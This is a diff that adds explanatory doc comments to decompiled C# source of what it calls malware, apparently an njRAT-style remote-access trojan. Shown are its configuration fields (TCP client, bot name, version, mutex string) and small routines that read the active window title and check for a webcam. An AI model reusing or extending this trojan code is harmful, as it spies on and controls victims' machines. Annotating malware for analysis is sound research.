@@ -27,12 +27,24 @@ using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
+/**
+ * @file OK.cs
+ * @brief Core functionality for system operations, network communication,
+ *        anti-analysis, persistence, and dynamic plugin loading.
+ *
+ * This file implements many routines essential to the malware’s behavior.
+ * Below are rewritten excerpts with inline documentation for the key functions.
+ */
+
 #nullable disable
 namespace j
 {
   [StandardModule]
   internal sealed class OK
   {
+            //==============================================================================
+        // Static Fields: Configuration, state, and resources.
+        //==============================================================================
     private static byte[] b = new byte[5121];
     public static bool BD = Conversions.ToBoolean("True");
     public static TcpClient C = (TcpClient) null;
@@ -59,7 +71,11 @@ namespace j
     public static string VN = "TXlCb3Q=";
     public static string VR = "0.7d";
     public static string Y = "Y262SUCZ4UJJ";
-
+/**
+ * @brief Retrieves the active window's title and encodes it in Base64.
+ *
+ * @return Base64 encoded title of the active window, or empty string if unavailable
+ */
     public static string ACT()
     {
       string str1;
@@ -83,8 +99,18 @@ namespace j
       return str1;
     }
 
+/**
+ * @brief Converts a byte array to a UTF-8 string
+ * 
+ * @param B Reference to the byte array to convert
+ * @return UTF-8 string representation of the byte array
+ */
     public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);
-
+/**
+ * @brief Checks if a camera is available on the system
+ * 
+ * @return true if at least one camera device is detected, false otherwise
+ */
     public static bool Cam()
     {
       try
